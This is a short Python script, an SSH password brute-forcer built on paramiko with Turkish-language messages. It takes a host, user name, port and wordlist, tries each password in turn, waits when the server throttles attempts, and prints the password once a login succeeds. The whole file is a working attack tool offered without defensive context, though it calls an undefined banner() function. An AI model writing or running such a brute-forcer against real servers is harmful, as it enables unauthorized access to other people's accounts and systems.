#!/bin/python3
import time
import os
import paramiko
import sys
import argparse
def parse():
 global host,user,port,path_to_file
 print(banner())
 parser = argparse.ArgumentParser(description="SSH BRUTEFORCER V 0.1")
 parser.add_argument("host", help="Server İp Adress")
 parser.add_argument("--wordlist", help="Şifre Listesi yolu")
 parser.add_argument("-U", "--user", help="KULLANICI ADI ")
 parser.add_argument("-P","--port",help="Port Numarası ")
 args = parser.parse_args()
 host = args.host
 path_to_file= args.wordlist
 user = args.user
 port=args.port
def main():
 global passwords
 parse()
 passwords=get_password()
 connection()
 bruteforce(passwords)
def get_password():
 passwords=[]
 with open (path_to_file,'r') as file:
  passwords=[row.strip() for row in file]
 return passwords
def connection():
  global client
  client = paramiko.SSHClient()
  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
def bruteforce(passwords):
 print("Başlatılıyor Abi => ")
 for password in passwords:
  try:
   client.connect(hostname=host, username=user, password=password, port=port)
  except paramiko.ssh_exception.AuthenticationException:
   print("Deneniyor Abi => :{}".format(password))
   continue
  except paramiko.SSHException:
   print("Kapanır 20 saniye içinde sabret :D ")
   time.sleep(20)
   continue
  else:
   print("ŞİFRE BULUNDU ABİ =>>> !:{}".format(password))
   client.close()
   sys.exit()
main()
